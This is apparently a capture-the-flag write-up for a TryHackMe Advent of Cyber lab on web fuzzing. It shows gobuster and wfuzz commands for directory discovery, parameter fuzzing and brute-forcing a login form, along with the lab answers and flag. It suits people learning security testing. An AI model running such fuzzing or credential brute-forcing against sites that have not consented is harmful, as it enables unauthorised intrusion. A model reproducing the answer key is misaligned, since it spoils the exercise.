---
description: Web Exploitation - gobuster ; wfuzz
---

# Santa's watching

## Video

{% embed url="https://www.youtube.com/watch?v=7GAFQdYCk5s" %}

## Resources

gobuster recommended wordlist﻿ to use: [big.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt)

## Challenge

`gobuster dir -u http://example.com -w wordlist.txt -x php,txt,html`

Recommend wordlist https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt

`wfuzz -c -z file,/usr/share/wordlists/dirb/big.txt localhost:80/FUZZ/note.txt`

`wfuzz -c -z file,mywordlist.txt -d “username=FUZZ&password=FUZZ” -u http://shibes.thm/login.php`

Recommended wordlist https://assets.tryhackme.com/additional/cmn-aoc2020/day-4/wordlist

### Deploy your AttackBox 

{% hint style="success" %}
No answer needed
{% endhint %}

### Given the URL "http://shibes.xyz/api.php", what would the entire wfuzz command look like to query the "breed" parameter using the wordlist "big.txt" \(assume that "big.txt" is in your current directory\)

**Note:** For legal reasons, do not actually run this command as the site in question has not consented to being fuzzed!

{% hint style="success" %}
wfuzz -c -z file,big.txt http://shibes.xyz/api.php?breed=FUZZ
{% endhint %}

### Use GoBuster \(against the target you deployed -- not the shibes.xyz domain\) to find the API directory. What file is there?

![](../.gitbook/assets/image%20%2814%29.png)

`wget https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt`

`gobuster dir -u http://10.10.136.48/ -w big.txt -x php`

![](../.gitbook/assets/image%20%2824%29.png)

![](../.gitbook/assets/image%20%281%29.png)

{% hint style="success" %}
site-log.php
{% endhint %}

### Fuzz the date parameter on the file you found in the API directory. What is the flag displayed in the correct post?

`wfuzz -v -c -z file,wordlist -u http://10.10.136.48/api/site-log.php?date=FUZZ`

![](../.gitbook/assets/image%20%2820%29.png)

**`curl http://10.10.136.48/api/site-log.php?date=20201125`**

![](../.gitbook/assets/image%20%2853%29.png)

{% hint style="success" %}
THM{D4t3\_AP1}
{% endhint %}

